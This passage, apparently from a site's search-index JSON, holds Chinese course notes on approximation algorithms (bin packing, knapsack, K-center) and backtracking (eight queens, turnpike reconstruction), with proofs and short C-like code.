</ol> <p>\u5018\u82e5\u4e00\u4e2a\u89e3\u6cd5\uff1a</p> <ol> <li>\u540c\u65f6\u6ee1\u8db3\u6700\u4f18\u6027\u548c\u9ad8\u6548\u6027\uff0c\u90a3\u4e48\u8fd9\u4e2a\u7b97\u6cd5\u5bf9\u7279\u6b8a\u60c5\u51b5\u80fd\u9ad8\u6548\u6c42\u51c6\u786e\u89e3\uff1b</li> <li>\u540c\u65f6\u6ee1\u8db3\u6700\u4f18\u6027\u548c\u666e\u904d\u6027\uff0c\u90a3\u4e48\u8fd9\u4e2a\u7b97\u6cd5\u5bf9\u6240\u6709\u60c5\u51b5\u90fd\u80fd\u6c42\u51c6\u786e\u89e3\uff1b</li> <li>\u540c\u65f6\u6ee1\u8db3\u9ad8\u6548\u6027\u548c\u666e\u904d\u6027\uff0c\u90a3\u4e48\u8fd9\u4e2a\u7b97\u6cd5\u53ef\u80fd\u662f\u4e2a\u8fd1\u4f3c\u7b97\u6cd5\uff1b</li> </ol> <p>\u5b58\u5728\u4e00\u4e2a\u7b97\u6cd5\u80fd\u591f\u540c\u65f6\u6ee1\u8db3\u4e0a\u9762\u4e09\u4e2a\u7279\u6027\u7684\u524d\u63d0\u6761\u4ef6\u662f\uff0c\u80fd\u591f\u8bc1\u660e \\(P=NP\\)\u3002</p>"},{"location":"Courses/DS/ADS/Approximation/#_1","title":"\u7ecf\u5178\u6848\u4f8b\uff1a\u8fd1\u4f3c\u88c5\u7bb1\u95ee\u9898","text":"<p>\u7ed9\u51fa \\(N\\) \u4e2a\u5927\u5c0f\u5206\u522b\u4e3a \\(S_1, S_2,... S_N\\) \u7684\u7269\u4f53\uff0c\u6bcf\u4e2a\u7bb1\u5b50\u7684\u5bb9\u91cf\u4e3a 1\uff0c\u5219\u6700\u5c11\u9700\u8981\u591a\u5c11\u7bb1\u5b50\u624d\u80fd\u628a\u6240\u6709\u7269\u54c1\u88c5\u4e0b\u3002</p> <p>\u66b4\u529b\u7b97\u6cd5\u9700\u8981\u5217\u4e3e\u6240\u6709\u6392\u5217\uff0c\u6240\u4ee5\u5b83\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a\u6307\u6570\u7ea7\uff0c\u5219\u88c5\u7bb1\u95ee\u9898\u5c5e\u4e8e \\(NPH\\) \u95ee\u9898\u3002</p>"},{"location":"Courses/DS/ADS/Approximation/#next-fit","title":"Next Fit","text":"<p>NF \u7b56\u7565\u603b\u662f\u9009\u62e9\u5f53\u524d\u6700\u540e\u4e00\u4e2a bin\uff0c\u82e5\u80fd\u591f\u5bb9\u7eb3\uff0c\u5219\u5c06\u5f53\u524d item \u653e\u5165\u5176\u4e2d\uff0c\u5426\u5219\u65b0\u5f00\u4e00\u4e2a bin\u3002</p> <p>NF \u7b56\u7565\u603b\u662f\u4f7f\u7528\u4e0d\u8d85\u8fc7\u00a02M\u22121\u00a0\u4e2a bin\uff0c\u5176\u4e2d\u00a0M\u00a0\u8868\u793a\u51c6\u786e\u89e3\u7684\u00a0bin \u6570\u3002</p> <p>\u8bc1\u660e\uff1a</p> <p>\u9996\u5148\u6211\u4eec\u80fd\u591f\u786e\u5b9a\uff0c\u76f8\u90bb\u4e24\u4e2a\u7bb1\u5b50\u88c5\u7684 Size \u6570\u548c\u5927\u4e8e 1\uff0c\u5373 \\(S(B_i) +S(B_{i+1}) \\gt 1\\) \u3002\u5f53 NF \u7b97\u6cd5\u7684\u7ed3\u679c\u4e3a \\(2M-1\\) \u65f6\uff1a</p> \\[ \\begin{array}c \\begin{cases} S(B_1) +S(B_2) &amp;\\gt 1 \\\\ S(B_2) +S(B_3) &amp;\\gt 1 \\\\ &amp; ...  \\\\ S(B_{2M-3}) +S(B_{2M-2}) &amp;\\gt 1  \\\\ S(B_{2M- 1}) &amp;\\le 1 \\end{cases} \\\\ \\Rightarrow \\sum_{i=1}^{2M-1}\\gt \\sum_{i=1}^{2M-2} \\gt M-1 \\\\ \\Rightarrow \\sum_{i=1}^{2M-1} \\ge M \\end{array} \\] <p>\u56e0\u6b64\u5bf9\u4e8e \\(2M-1\\)\uff0c\u6700\u4f18\u89e3\u8d77\u7801\u9700\u8981 \\(M\\) \u4e2a Bin \u624d\u80fd\u88c5\u4e0b\u6240\u6709\u3002</p> <p>\u800c\u5982\u679c\u7b97\u6cd5\u7ed3\u679c\u4e3a \\(2M\\) \uff1a</p> \\[ \\sum_{i=1}^{2M} \\gt \\frac{2M}{2} \\Rightarrow \\sum_{i=1}^{2M} \\ge M+1 \\] <p>\u5373\u81f3\u5c11\u9700\u8981 \\(M+1\\) \u4e2a Bin \u624d\u80fd\u88c5\u4e0b\u6240\u6709\uff0c\u77db\u76fe\u3002</p>"},{"location":"Courses/DS/ADS/Approximation/#first-fit","title":"First Fit","text":"<p>FF \u7b56\u7565\u603b\u662f\u9009\u62e9\u7b2c\u4e00\u4e2a\u80fd\u653e\u4e0b\u5f53\u524d item \u7684 bin\uff0c\u82e5\u6240\u6709 bin \u90fd\u65e0\u6cd5\u5bb9\u7eb3\u5f53\u524d item\uff0c\u5219\u65b0\u5f00\u4e00\u4e2a bin\u3002</p> <p>\u91c7\u7528\u5408\u9002\u7684\u6570\u636e\u7ed3\u6784\uff0c\u53ef\u4ee5\u4f7f\u8be5\u7b97\u6cd5\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(N\\log N)\\)\u3002</p> <p>NF \u7b56\u7565\u603b\u662f\u4f7f\u7528\u4e0d\u8d85\u8fc7\u00a0\u230a1.7M\u230b \u4e2a bin\uff0c\u5e76\u4e14\u5b58\u5728\u4e00\u65cf\u80fd\u5bf9\u8fb9\u754c\u53d6\u7b49\u7684\u8f93\u5165\uff0c\u5176\u4e2d\u00a0M\u00a0\u8868\u793a\u51c6\u786e\u89e3\u7684\u00a0bin \u6570\u3002</p>"},{"location":"Courses/DS/ADS/Approximation/#best-fit","title":"Best Fit","text":"<p>BF \u7b56\u7565\u603b\u662f\u9009\u62e9\u80fd\u591f\u5bb9\u7eb3\u5f53\u524d item \u4e14\u5269\u4f59\u7a7a\u95f4\u6700\u5c0f\u7684 bin\uff08\u5373 tightest\uff09\uff0c\u82e5\u6240\u6709 bin \u90fd\u65e0\u6cd5\u5bb9\u7eb3\u5f53\u524d item\uff0c\u5219\u65b0\u5f00\u4e00\u4e2a bin\u3002</p> <p>\u91c7\u7528\u5408\u9002\u7684\u6570\u636e\u7ed3\u6784\uff0c\u53ef\u4ee5\u4f7f\u8be5\u7b97\u6cd5\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(N\\log N)\\)\u3002</p> <p>NF \u7b56\u7565\u4e5f\u603b\u662f\u4f7f\u7528\u4e0d\u8d85\u8fc7\u00a0\u230a1.7M\u230b\u00a0\u4e2a bin\uff0c\u5e76\u4e14\u5b58\u5728\u4e00\u65cf\u80fd\u5bf9\u8fb9\u754c\u53d6\u7b49\u7684\u8f93\u5165\uff0c\u5176\u4e2d\u00a0M\u00a0\u8868\u793a\u51c6\u786e\u89e3\u7684\u00a0bin \u6570\u3002</p> <p>Online</p> <p>\u4e0a\u8ff0\u4e09\u4e2a\u65b9\u6cd5\u90fd\u5c5e\u4e8e\u5728\u7ebf\u7b97\u6cd5(online)\uff0c\u5176\u7279\u70b9\u5728\u4e8e\u5bf9\u672a\u6765\u7684\u6570\u636e\u4e0d\u53ef\u77e5\uff0c\u4e14\u4e0d\u80fd\u4fee\u6539\u4e0a\u4e00\u6b65\u6240\u4f5c\u7684\u51b3\u7b56\u3002\u5728\u6d4b\u8bd5\u4e2d\uff0c\u6211\u4eec\u603b\u80fd\u6784\u9020\u4e00\u7ec4\u8f93\u5165\u4f7f\u5f97\u7ed3\u679c\u5904\u4e8e\u6700\u574f\u7684\u60c5\u51b5\u4e0a\u3002</p> <p>\u4e8b\u5b9e\u4e0a\uff0c\u5bf9\u4e8e online \u7b97\u6cd5\uff0c\u7406\u8bba\u8bc1\u660e\u603b\u80fd\u6784\u9020\u4e00\u7ec4\u8f93\u5165\uff0c\u4f7f\u5f97\u7b97\u6cd5\u7ed3\u679c\u6700\u5c11\u4e3a\u51c6\u786e\u89e3\u7684 \\(5/3\\) \u500d\u3002</p>"},{"location":"Courses/DS/ADS/Approximation/#first-fit-decreasing","title":"First Fit Decreasing","text":"<p>FFD \u5c5e\u4e8e\u79bb\u7ebf\u7b97\u6cd5\uff0c\u5b83\u5c06\u00a0item \u6309\u7167 size \u964d\u5e8f\u6392\u5e8f\uff0c\u800c\u540e\u4f7f\u7528 FF\uff08\u6216 BF\uff0c\u7531\u4e8e\u5355\u8c03\u6027\uff0c\u4e24\u8005\u7b49\u4ef7\uff09\u3002</p> <p>FFD \u7b56\u7565\u603b\u662f\u4f7f\u7528\u4e0d\u8d85\u8fc7 \\(\\frac{11}{9}M+ \\frac{2}{3}\\) \u4e2a bin\uff0c\u5e76\u4e14\u5b58\u5728\u4e00\u65cf\u80fd\u5bf9\u8fb9\u754c\u53d6\u7b49\u7684\u8f93\u5165\uff0c\u5176\u4e2d M \u8868\u793a\u51c6\u786e\u89e3\u7684 bin \u6570\u3002</p>"},{"location":"Courses/DS/ADS/Approximation/#_2","title":"\u7ecf\u5178\u6848\u4f8b\uff1a\u80cc\u5305\u95ee\u9898","text":"<p>\u4f53\u79ef\u4e3a \\(M\\) \u7684\u80cc\u5305\uff0c\u53bb\u88c5 \\(N\\) \u4e2a\u7269\u54c1\u3002\u6bcf\u4e2a\u7269\u54c1 \\(i\\) \u6709\u91cd\u91cf \\(w_i\\) \u548c\u4ef7\u503c \\(p_i\\) \u3002</p> <p>\u5bf9\u4e8e Fractional Version \uff0c\u4e00\u4e2a\u7269\u54c1\u53ef\u4ee5\u9009\u62e9\u53ea\u88c5\u4e00\u90e8\u5206\u8fdb\u5165\u80cc\u5305\uff0c\u5219\u6b64\u65f6\u7269\u54c1\u91cd\u91cf\u548c\u4ef7\u503c\u540c\u65f6\u4e58\u4ee5\u767e\u5206\u6bd4\u3002\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u8d2a\u5fc3\u7b97\u6cd5\uff0c\u6309\u7167\u6027\u4ef7\u6bd4\u4ece\u9ad8\u5230\u4f4e\u88c5\u5165\u5373\u53ef\u5f97\u5230\u6700\u4f18\u89e3\u3002</p> <p>\u6211\u4eec\u4e3b\u8981\u8ba8\u8bba\u7684\u4e3a 0-1 Version\uff0c\u5373\u7269\u54c1\u4e0d\u80fd\u88ab\u5206\u5272\uff0c\u8981\u4e48\u662f 0 \u8981\u4e48\u662f 1\uff0c\u8fd9\u662f\u4e00\u4e2a\u7ecf\u5178\u7684 \\(NPH\\) \u95ee\u9898\u3002</p>"},{"location":"Courses/DS/ADS/Approximation/#greedy-algorithm","title":"Greedy Algorithm","text":"<p>\u8d2a\u5fc3\u7b56\u7565\u53ef\u4ee5\u9009\u62e9\u5f53\u524d\u80fd\u591f\u88c5\u5165\u7684\u7269\u54c1\u4e2d\uff0c\u4ef7\u503c\u6700\u9ad8\u7684\u6216\u662f\u6027\u4ef7\u6bd4\u6700\u9ad8\u7684\u3002\u4e24\u79cd\u51b3\u7b56\u5f97\u5230\u7684\u8fd1\u4f3c\u6bd4\u5747\u4e3a 2\u3002</p> <p>\u5728\u6b64\u7ed9\u51fa\u7b80\u5355\u8bc1\u660e\uff1a</p> \\[ \\begin{array}l (1)\\ p_{max}\\le P_{opt}\\le P_{frac} \\\\ (2)\\ p_{max}\\le P_{greedy} \\\\ (3)\\ P_{opt} \\le P_{frac} \\le P_{greedy} +p_{max} \\\\ (4)\\ \\rho = P_{opt} / P_{greedy} \\le 1+ p_{max} / P_{greedy} \\le 2 \\end{array} \\] <ul> <li>&lt;1&gt; \u9009\u62e9\u4ef7\u503c\u6700\u9ad8\u7684\u8d2a\u5fc3\u7b97\u6cd5\u603b\u4ef7\u503c\u5c0f\u4e8e 0-1 \u80cc\u5305\u95ee\u9898\u7684\u6700\u4f18\u89e3\uff0c\u800c fractional \u80cc\u5305\u95ee\u9898\u7684\u6700\u4f18\u89e3\u5927\u4e8e 0-1 \u95ee\u9898\u7684\u6700\u4f18\u89e3</li> <li>&lt;2&gt; \\(P_{greedy}= \\max (p_{max}, p_{density})\\) \uff0c\u8d2a\u5fc3\u7b97\u6cd5\u7684\u7ed3\u679c\u4e3a\u4e24\u79cd\u7b56\u7565\u7684\u6700\u5927\u503c</li> <li>&lt;3&gt; \u8003\u8651 \\(P_{frac} \\le p_{density} + p_{max}\\le P_{greedy} +p_{max}\\)<ul> <li>fractional \u6700\u4f18\u89e3\u548c\u6027\u4ef7\u6bd4\u4f18\u5148\u8d2a\u5fc3\u7b97\u6cd5\u7684\u5dee\u522b\u5c31\u5728\u4e8e\u80cc\u5305\u662f\u5426\u7559\u4e0b\u7a7a\u4f4d\uff0c\u800c\u8fd9\u4e2a\u7a7a\u4f4d\u7684\u4ef7\u503c\u4e00\u5b9a\u5c0f\u4e8e \\(p_{max}\\) </li> </ul> </li> <li>&lt;4&gt; \u4e0d\u7b49\u5f0f\u4e24\u8fb9\u9664\u4ee5 \\(P_{greedy}\\) \uff0c\u5f97\u5230\u8fd1\u4f3c\u6bd4\u5c0f\u4e8e 2</li> </ul>"},{"location":"Courses/DS/ADS/Approximation/#dynamic-programming","title":"Dynamic Programming","text":"<p>\\(W_{i,p}\\) \u8868\u793a\u4ece\u7269\u54c1 \\(\\{1,...,i\\}\\) \u4e2d\u88c5\u4e0b\u603b\u4ef7\u503c \\(p\\) \u6240\u9700\u8981\u7684\u6700\u5c0f\u91cd\u91cf\u3002\u5219\u52a8\u6001\u89c4\u5212\u7684\u9012\u5f52\u5f0f\u4e3a\uff1a</p> \\[ W_{i,p} =\\begin{cases}p==0?0:\\infty, &amp; i=0 \\\\ W_{i-1,p}, &amp; p_i &gt;p \\\\ \\min (W_{i-1,p} , w_i + W_{i-1,p- p_i}), &amp; \\text{Otherwise} \\end{cases} \\] <p>\\(i\\) \u7684\u53d6\u503c\u4e3a \\(1,2,...,n\\)\uff0c\u800c \\(p\\) \u7684\u53d6\u503c\u4e3a \\(1,..., np_{max}\\)\uff0c\u6240\u4ee5\u603b\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(n^2 p_{max})\\)</p> <pre><code>// assume n: \u7269\u54c1\u6570\u91cf, pmax: \u6700\u5927\u7269\u54c1\u4ef7\u503c, dp[i][p]: \u524d i \u4e2a\u7269\u54c1\u4e2d\uff0c\u603b\u4ef7\u503c\u4e3a p \u7684\u6700\u5c0f\u91cd\u91cf\nint MaxValue = 0;\nfor(int i = 0; i &lt;= n ; i++ )\n    for(int j = 0; j &lt;= n * pmax; j++)\n    {\n        if(i == 0)\n            dp[i][j] = j == 0 ? 0 : INF;\n        else if(p[i] &lt;= j)\n            dp[i][j] = min(dp[i-1][j], dp[i-1][j - p[i]] + w[i]);\n        else    \n            dp[i][j] = dp[i-1][j];\n        if(j &gt; MaxValue &amp;&amp; dp[i][j] &lt;= W)\n            MaxValue = j;\n    }\n</code></pre> <p>\u867d\u7136\u770b\u4e0a\u53bb\u662f\u591a\u9879\u5f0f\u65f6\u95f4\u590d\u6742\u5ea6\uff0c\u4f46\u662f\u7531\u4e8e \\(p_{max}\\) \u7684\u503c\u5f80\u5f80\u8fdc\u5927\u4e8e \\(n\\) \uff0c\u53ef\u80fd\u4f1a\u8fbe\u5230\u6307\u6570\u7ea7\u522b\u3002\u8fd9\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u727a\u7272\u4e00\u4e9b\u7cbe\u5ea6\uff0c\u5c06 \\(profit\\) \u505a\u4e00\u4e9b\u820d\u5165(\u5411\u4e0a\u53d6\u6574)\u4ece\u800c\u5f97\u5230\u66f4\u5c0f\u7684 \\(p_{max}\\) \uff1a</p> <p></p> <p>\u4e0d\u8fc7\u4e00\u822c 0-1 \u80cc\u5305\u95ee\u9898\u91c7\u7528\u5982\u4e0b\u52a8\u6001\u89c4\u5212\u6c42\u89e3\uff1a</p> <pre><code>// assume n: \u7269\u54c1\u6570\u91cf, m:\u80cc\u5305\u5bb9\u91cf, dp[i][j]: \u524d i \u4e2a\u7269\u54c1\u4e2d\uff0c\u5bb9\u91cf\u4e3a j \u7684\u6700\u5927\u4ef7\u503c\nfor(int i = 0; i &lt;= n ; i++ )\n    for(int j = 0; j &lt;= m ; j++ )\n    {\n        if(i == 0 || j == 0) // initialize\n            dp[i][j] = 0;\n        else if(j &lt; w[i]) // cannot put i-th item\n            dp[i][j] = dp[i-1][j];\n        else // can put i-th item\n            dp[i][j] = max(dp[i-1][j], dp[i-1][j-w[i]] + p[i]);\n    }\nint MaxValue = dp[n][m];\n</code></pre> <p>\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(nm)\\)\uff0c\u7531\u4e8e\u80cc\u5305\u5bb9\u91cf m \u672c\u8d28\u4e0a\u662f\u6307\u6570\u7ea7\u522b\u7684\uff0c\u6240\u4ee5\u5e76\u4e0d\u662f\u591a\u9879\u5f0f\u7ea7\u522b\u590d\u6742\u5ea6</p> <p>\u7531\u4e8e\u8f93\u5165 m \u7684\u89c4\u6a21\u53ef\u4ee5\u88ab\u624b\u52a8\u538b\u4e0b\u53bb\uff0c\u6240\u4ee5\u8fd9\u5176\u5b9e\u662f\u4e00\u4e2a\u4f2a\u591a\u9879\u5f0f\u7b97\u6cd5\u3002\u4f2a\u591a\u9879\u5f0f\u7b97\u6cd5\u7684\u4f18\u70b9\u5728\u4e8e\u5f88\u5bb9\u6613\u6539\u9020\u6210 FPTAS \u8fd1\u4f3c\u7b97\u6cd5\u3002</p>"},{"location":"Courses/DS/ADS/Approximation/#k-center-problem","title":"\u7ecf\u5178\u6848\u4f8b\uff1aK-Center Problem","text":"<p>\u5728\u5e73\u9762\u4e0a\u6709 \\(n\\) \u4e2a\u70b9\uff0c\u9700\u8981\u5728\u5e73\u9762\u4e0a\u753b\u51fa \\(k\\) \u4e2a\u5706\uff0c\u8981\u6c42\u70b9\u79bb\u6700\u8fd1\u7684\u5706\u5fc3\u7684\u6700\u5927\u8ddd\u79bb\u6700\u5c0f\u5316\u3002</p> <p>\u76f4\u63a5\u6b63\u5411\u6c42\u89e3\u53ef\u80fd\u65e0\u4ece\u4e0b\u624b\uff0c\u53ef\u4ee5\u4f7f\u7528\u4e8c\u5206\u6cd5\u5c1d\u8bd5\u5f97\u5230\u8fd1\u4f3c\u7684\u7b54\u6848\u3002\u9996\u5148\u9700\u8981\u5b9a\u4e49\u4e00\u4e2a\u68c0\u6d4b\u534a\u5f84 \\(r\\) \u80fd\u5426\u5305\u56f4\u5168\u90e8\u70b9\u7684\u51fd\u6570\u3002</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u51c6\u786e\u89e3\u7684\u534a\u5f84 \\(r^*\\) \uff0c\u6211\u4eec\u4ee5\u4e00\u4e2a\u5706\u5185\u4efb\u610f\u4e00\u70b9\u4e3a\u5706\u5f62\uff0c\u4ee5 \\(2r^*\\) \u4e3a\u534a\u5f84\u753b\u4e00\u4e2a\u66f4\u5927\u7684\u5706\uff0c\u5219\u8fd9\u4e2a\u65b0\u5706\u80fd\u591f\u4fdd\u8bc1\u6240\u6709\u539f\u6765\u7684\u5706\u5185\u7684\u70b9\u90fd\u88ab\u5305\u542b\u5728\u5185\uff0c\u5219\u6211\u4eec\u76f4\u63a5\u5c06\u8fd9\u4e2a\u4e24\u500d\u534a\u5f84\u4f5c\u4e3a\u8fd1\u4f3c\u89e3\u3002</p> <pre><code>Centers  Greedy-2r ( Sites S[ ], int n, int K )\n{   Centers  C[ ] = \uf0c6;\n    Select any s from S and add it to C;\n    while ( |C| &lt; K ) {\n        Select s from S with maximum dist(s, C);\n        Add s it to C;\n    } /* end-while */\n    return C;\n}\n</code></pre> <p>\u8be5\u51fd\u6570\u4e2d\uff0c|C|\u76f8\u6bd4\u51c6\u786e\u60c5\u51b5\u504f\u5c0f\uff0c\u6240\u4ee5\u53ea\u80fd\u4fdd\u8bc1\u7ed3\u679c\u7684\u4e0a\u754c\uff0c\u4e0b\u754c\u5219\u4e0d\u51c6\u786e</p> <p>\u82e5\u6c42\u51fa\u6765\u6240\u9700\u7684\u4e2d\u5fc3\u6570\u5927\u4e8e \\(K\\) \uff0c\u8bf4\u660e\u9700\u8981\u66f4\u5927\u7684\u6700\u5c0f\u534a\u5f84\u624d\u80fd\u5305\u56f4\u6240\u6709\u70b9\u3002\u800c\u5982\u679c\u6240\u9700\u4e2d\u5fc3\u6570\u5c0f\u4e8e\u7b49\u4e8e \\(K\\) \uff0c\u5219\u5c1d\u8bd5\u7f29\u5c0f\u6700\u5c0f\u534a\u5f84\uff0c\u76f4\u5230\u6070\u597d\u4e0d\u80fd\u5305\u56f4\u6240\u6709\u70b9\u4e3a\u6b62\u3002</p> <p>\u7531\u4e8e\u5305\u56f4\u7684\u5706\u91c7\u7528\u4e24\u500d\u5c0f\u5706\u7684\u534a\u5f84\u4ee5\u5305\u56f4\u5c0f\u5706\u4e2d\u7684\u6240\u6709\u70b9\uff0c\u8be5\u8fd1\u4f3c\u7b97\u6cd5\u7684\u8fd1\u4f3c\u6bd4\u4e3a \\(\\rho =2\\)\uff0c\u5373\u4e3a 2-approximation\uff0c\u6700\u7ec8\u6240\u6c42\u7684\u7ed3\u679c\u4e5f\u8981\u4e58\u4ee5 2\uff0c\u5373 \\(2r\\)\u3002</p> <p>\u9664\u975e \\(P=NP\\)\uff0c\u5426\u5219K-Center\u95ee\u9898\u4e0d\u5b58\u5728 ratio &lt; 2 \u7684\u89e3\u51b3\u65b9\u6cd5</p>"},{"location":"Courses/DS/ADS/Backtracking/","title":"Backtracking","text":""},{"location":"Courses/DS/ADS/Backtracking/#backtracking","title":"Backtracking","text":"<p> \u7ea6 1693 \u4e2a\u5b57  81 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 9 \u5206\u949f</p> <p>\u56de\u6eaf\u7b97\u6cd5\u7684\u601d\u60f3\u5c31\u662f\u4ece\u4e00\u4e2a\u5927\u7684\u5019\u9009\u7b54\u6848\u4e2d\u526a\u53bb\u5df2\u7ecf\u53ef\u4ee5\u8bc1\u660e\u662f\u4e0d\u53ef\u80fd\u6b63\u786e\u7684\u5206\u652f\uff0c\u5373 Prunning\u3002</p>"},{"location":"Courses/DS/ADS/Backtracking/#eight-queens","title":"Eight Queens","text":"<p>\u5728 \\(8\\times 8\\) \u7684\u68cb\u76d8\u4e0a\u653e\u7f6e\u516b\u4e2a Queens\uff0c\u8981\u6c42\u6240\u6709 Queen \u90fd\u4e0d\u80fd\u653b\u51fb\u5230\u5f7c\u6b64\uff0c\u4ea6\u5373\u6a2a\u7ad6\u4ee5\u53ca\u5bf9\u89d2\u7ebf\u4e0a\u90fd\u4e0d\u80fd\u540c\u65f6\u6709\u4e24\u4e2a Queen\u3002</p> <p>\u4e00\u4e2a\u53ef\u80fd\u7684\u586b\u6cd5\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u6309\u7167\u5e38\u89c4\u7684\u601d\u60f3\uff0c\u7531\u4e8e\u68cb\u76d8\u6a2a\u7ad6\u90fd\u53ea\u6709\u4e00\u4e2a Queen\uff0c\u6211\u4eec\u5b9a\u4e49 \\(Q_i\\) \u4e3a\u7b2c i \u884c\u7684 Queen\uff0c\\(x_i\\) \u4e3a\u5176\u5bf9\u5e94\u7684\u5217\uff0c\u90a3\u4e48 \\(x_i\\in \\{1,2,3,4,5,6,7,8\\}\\) \uff0c\u4e14\u6ca1\u6709\u91cd\u590d\u5143\u7d20\u3002\u90a3\u4e48\uff0c\u4e00\u5171\u6709 \\(n!\\) \u79cd\u60c5\u51b5\u53ef\u4f9b\u9009\u62e9\u3002</p> <p>\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u5c06\u516b\u7687\u540e\u95ee\u9898\u8fdb\u884c\u7b80\u5316\uff0c\u9009\u53d6\u56db\u7687\u540e\u95ee\u9898\u8bb2\u89e3\uff0c\u5176 game tree \u5982\u4e0b\uff1a</p> <p></p> <p>\u5171\u6709 \\(4!\\) \u4e2a\u53f6\u8282\u70b9\uff0c\u5bf9\u5e94\u4e0a\u9762\u7684 \\(n!\\) \u79cd\u9009\u62e9\u3002\u4f46\u662f\u6211\u4eec\u5224\u65ad\u662f\u5426\u6b63\u786e\u8fd8\u6709\u53e6\u4e00\u4e2a\u6761\u4ef6\uff0c\u5373\u5bf9\u89d2\u7ebf\u4e0a\u53ea\u80fd\u6709\u4e00\u4e2a Queen\uff0c\u5373 \\(\\frac{x_i +x_i}{i-j}!= \\text{\u00b1}1\\)\u90a3\u6211\u4eec\u5728\u8fed\u4ee3\u5230\u67d0\u4e00\u8282\u70b9\u65f6\u53ef\u4ee5\u5bf9\u5176\u8fdb\u884c\u6761\u4ef6\u5224\u65ad\uff0c\u5982\u679c\u6761\u4ef6\u4e0d\u6ee1\u8db3\uff0c\u5219\u76f4\u63a5\u8fd4\u56de\u4e0a\u4e00\u5c42\u8282\u70b9\uff0c\u4e0d\u518d\u5bf9\u4e0b\u5c42\u8282\u70b9\u8fdb\u884c\u5224\u65ad\u3002</p> <p></p> <p>\u5982\u56fe\uff0c\u5bf9 game tree \u8fdb\u884c\u6df1\u5ea6\u4f18\u5148\u641c\u7d22\uff0c\u6bcf\u904d\u5386\u5230\u4e00\u4e2a\u8282\u70b9\u5373\u8fdb\u884c\u4e00\u6b21\u5224\u65ad\uff0c\u82e5\u6761\u4ef6\u4ecd\u7136\u7b26\u5408\uff0c\u5219\u7ee7\u7eed\u5411\u4e0b\u641c\u7d22\uff1b\u82e5\u6761\u4ef6\u4e0d\u7b26\u5408\uff0c\u8fd4\u56de\u7236\u8282\u70b9\u3002\u6700\u7ec8\u53ef\u4ee5\u627e\u5230\u7b2c\u4e00\u6761\u7b26\u5408\u6761\u4ef6\u7684\u8def\u5f84\uff1a \\((2,4,1,3)\\)</p> <p>\u5b9e\u9645\u4e0a\u4e0d\u7528\u6784\u5efa\u62bd\u8c61\u6811\uff0c\u53ea\u662f\u7528\u4f5c\u8bb2\u89e3\u56de\u6eaf\u7684\u601d\u60f3</p>"},{"location":"Courses/DS/ADS/Backtracking/#the-turnpike-reconstruction-problem","title":"The Turnpike Reconstruction Problem","text":"<p>\u5373\u6536\u8d39\u7ad9\u91cd\u5efa\u95ee\u9898\uff0c\u5728\u4e00\u6761\u516c\u8def\u4e0a\u6709 N \u4e2a\u6536\u8d39\u7ad9\uff0c\u5219\u5b83\u4eec\u4e24\u4e24\u4e4b\u95f4\u4e00\u5171\u6709 \\(N(N-1)/2\\) \u4e2a\u8ddd\u79bb\u3002\u73b0\u5728\u53ea\u7ed9\u51fa\u5b83\u4eec\u4e4b\u95f4\u4e24\u4e24\u8ddd\u79bb\u7684\u96c6\u5408 \\(D\\) \uff0c\u5c1d\u8bd5\u5c06\u8fd9\u6761\u516c\u8def\u4e0a\u6536\u8d39\u7ad9\u7684\u4f4d\u7f6e\u5173\u7cfb\u6784\u5efa\u51fa\u6765\u3002</p> <p>\u6211\u4eec\u9996\u5148\u53ef\u4ee5\u77e5\u9053 \\(x_1\\) \u548c \\(x_N\\) \u8ddd\u79bb\u6700\u8fdc\uff0c\u5219\u7b2c\u4e00\u6b65\u4e3a\u8bbe\u5b9a \\(x_1=0, x_N = MAX\\{D\\}\\)\u3002</p> <p>\u5047\u8bbe\u6211\u4eec\u5df2\u7ecf\u5047\u5b9a\u4e86 \\(k\\) \u4e2a\u6536\u8d39\u7ad9\u7684\u70b9\u4f4d\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u5c06\u8981\u4ece \\(D\\) \u53d6\u51fa\u7b2c \\(k\\) \u5927\u7684\u5143\u7d20 \\(D_k\\) \u4ee5\u786e\u5b9a\u7b2c \\(k+1\\) \u4e2a\u6536\u8d39\u7ad9\u7684\u4f4d\u7f6e\uff0c\u90a3\u4e48\u5982\u679c \\(D_k\\) \u662f\u4e0e\u975e \\(x_1\\) \u6216 \\(x_N\\) \u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\uff0c\u5219\u8be5\u8282\u70b9\u4e0e \\(x_1\\) \u6216 \\(x_N\\) \u4e4b\u95f4\u7684\u8ddd\u79bb\u5927\u4e8e \\(D_k\\) \uff0c\u4e0e\u5927\u4e8e \\(D_k\\) \u7684\u8ddd\u79bb\u5747\u88ab\u53d6\u51fa\u8fd9\u4e00\u6761\u4ef6\u8fdd\u80cc\u3002\u56e0\u6b64 \\(D_k\\) \u4e00\u5b9a\u662f\u4e0e \\(x_1\\) \u6216 \\(x_N\\) \u4e4b\u95f4\u7684\u8ddd\u79bb\u3002</p> <p>\u7ed9\u5b9a \\(D=\\{1, 2, 2, 2, 3, 3, 3, 4, 5, 5, 5, 6, 7, 8, 10\\}\\) \uff0c\u5219 \\(N=6\\) \uff0c\\(x_1=0, x_N = 10\\)\u3002</p> <p>\u53ef\u4f5c\u51fa\u5bf9\u5e94\u51b3\u7b56\u6811\u5982\u4e0b\uff1a</p> <p></p> <p>\u5176\u601d\u60f3\u5199\u4f5c\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>bool Reconstruct ( DistType X[ ], DistSet D, int N, int left, int right )\n{ /* X[1]...X[left-1] and X[right+1]...X[N] are solved */\n    bool Found = false;\n    if ( Is_Empty( D ) )\n        return true; /* solved */\n    D_max = Find_Max( D );\n    /* option 1\uff1aX[right] = D_max */\n    /* check if |D_max-X[i]|in D is true for all X[i]\u2019s that have been solved */\n    // \u5373\u5224\u65ad\u65b0\u52a0\u5165\u7684\u70b9\u4ea7\u751f\u7684\u65b0Dist\u662f\u5426\u90fd\u5728\u96c6\u5408 D 